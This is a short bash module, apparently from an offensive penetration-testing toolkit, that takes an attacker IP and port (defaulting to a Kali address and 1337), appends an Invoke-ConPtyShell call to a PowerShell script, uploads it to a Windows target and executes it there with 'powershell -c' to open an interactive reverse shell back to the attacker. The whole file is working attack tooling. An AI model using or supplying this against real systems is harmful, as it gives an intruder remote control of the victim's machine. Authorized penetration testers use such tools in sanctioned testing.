#!/bin/bash

: '
ps: download Invoke-ConPtyShell.ps1 to server and start shell
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LHOST_FIELD=$(form_item  "LHOST" "number" "lhost" "${KALI_IP}")
PORT_FIELD=$(form_item  "port" "number" "port" "1337")

# Generate GUI form
generate_form "${LHOST_FIELD}" "${PORT_FIELD}"

LHOST=${form_data["lhost"]}
PORT=${form_data["port"]}

LOCATION="${SCRIPTS_DIR}/shell/windows/.files"
FILE="Invoke-ConPtyShell-shell.ps1"

SRC_FILE="${FILES_FOLDER}/Invoke-ConPtyShell.ps1"
TMP_FILE="${FILES_FOLDER}/Invoke-ConPtyShell-shell.ps1"

cp $SRC_FILE $TMP_FILE
echo "Invoke-ConPtyShell ${LHOST} ${PORT}" >> $TMP_FILE

ps_webclient_upload_file "${LOCATION}" "${FILE}"

execute_command "powershell -c '${FILE_LOCATION}'"
create_new_line
